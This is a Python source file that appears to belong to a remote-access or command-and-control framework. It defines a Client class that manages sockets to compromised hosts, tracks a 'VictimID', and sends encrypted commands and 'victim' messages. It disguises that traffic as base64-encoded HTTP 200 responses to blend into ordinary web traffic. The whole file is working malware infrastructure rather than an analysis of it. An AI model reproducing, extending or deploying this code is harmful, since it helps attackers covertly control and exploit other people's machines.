import socket
import ssl
import base64

from lib.EZCrypto import EZRSA, PAES,PRSA, Encoder
from lib.C2P import C2P

class Client:
    def __init__(self, sock: socket.socket) -> None:
        self.sock = sock
        self.addr = None
        self.type = None

        self.pAES = PAES()
        self.xml_rsa_pubKey = None
        self.xml_rsa_privKey = None

        self.szChallenge = ''
        self.username = None
        self.szUUID = None
        self.VictimID = None

        self.nLattency = None
        self.dtLastLattency = None

    def is_ssl_socket(self, sock: socket.socket) -> bool:
        return isinstance(sock, ssl.SSLSocket)

    def send(self, nCmd: int, nParam: int, szMsg: str):
        buffer = C2P(nCmd=nCmd, nParam=nParam, abData=szMsg.encode('utf-8')).get_buffer()
        self.sock.send(buffer)

    def http_send(self, nCmd: int, nParam: int, szMsg: str = ''):
        buffer = C2P(nCmd=nCmd, nParam=nParam, abData=szMsg.encode('utf-8')).get_buffer()
        szMsg = self.get_httpResponse_body(base64.b64encode(buffer).decode('utf-8'))
        self.sock.send(szMsg.encode('utf-8'))

    def sendcipher(self, nCmd: int, nParam: int, szMsg: str):
        szEncMsg = szMsg

        if not self.is_ssl_socket(self.sock):
            pAES = self.get_aes()
            abMsg = szMsg.encode('utf-8')
            abEncMsg = pAES.encrypt_cbc(abMsg)
            szEncMsg = Encoder.bytes2b64str(abEncMsg)
        else:
            szEncMsg = Encoder.stre2b64(szEncMsg)

        self.send(nCmd=nCmd, nParam=nParam, szMsg=szEncMsg)

    def http_sendcipher(self, nCmd: int, nParam: int, szMsg: str):
        pAES = self.get_aes()
        abMsg = szMsg.encode('ascii')
        abEncMsg = pAES.encrypt_cbc(abMsg)
        szEncMsg = base64.b64encode(abEncMsg).decode('utf-8')
        
        self.http_send(nCmd=nCmd, nParam=nParam, szMsg=szEncMsg)

    def sendpayload(self, szName: str):
        pass

    def sendcommand(self, nCmd: int, nParam: int):
        self.send(nCmd=nCmd, nParam=nParam, szMsg=C2P.random_str())

    def sendclnt(self, szMsg: str):
        self.sendcipher(3, 4, szMsg)

    def sendclntls(self, aMsg: list):
        self.sendcipher(3, 4, '|'.join([Encoder.stre2b64(x) for x in aMsg]))

    def sendclnterr(self, szCaption: str, szText: str, bShowMsgbox: bool = True):
        self.sendclnt(f'err|{int(bShowMsgbox)}|{Encoder.stre2b64(szCaption)}|{Encoder.stre2b64(szText)}')

    def sendvictim(self, aMsg: list):
        self.sendcipher(2, 2, '|'.join([Encoder.stre2b64(x) for x in aMsg]))

    def http_sendvictim(self, lsMsg: list):
        szMsg = '|'.join([Encoder.stre2b64(x) for x in lsMsg])
        abMsg = szMsg.encode('utf-8')
        
        pAes = self.get_aes()
        abCipher = pAes.encrypt_cbc(abMsg)
        buffer = C2P(2, 2, abData=abCipher).get_buffer()

        b64 = Encoder.bytes2b64str(buffer)
        szResp = self.get_httpResponse_body(b64)

        self.sock.send(szResp.encode('utf-8'))

    def sendraw(self, szMsg):
        self.sock.sendall(szMsg)

    def set_aes(self, pAES: PAES):
        self.pAES = pAES

    def get_aes(self) -> PAES:
        return self.pAES
    
    def get_httpResponse_body(self, szMessage: str) -> str:
        szMessage = Encoder.stre2b64(szMessage)
        nBodySize = len(szMessage)
        szRespHeader = (
            f'HTTP/1.1 200 OK\r\n'
            f'Content-Type: text/plain\r\n'
            f'Content-Length: {nBodySize}\r\n'
            f'\r\n'
        )

        szResp = szRespHeader + szMessage

        return szResp

    def close(self):
        self.sock.close()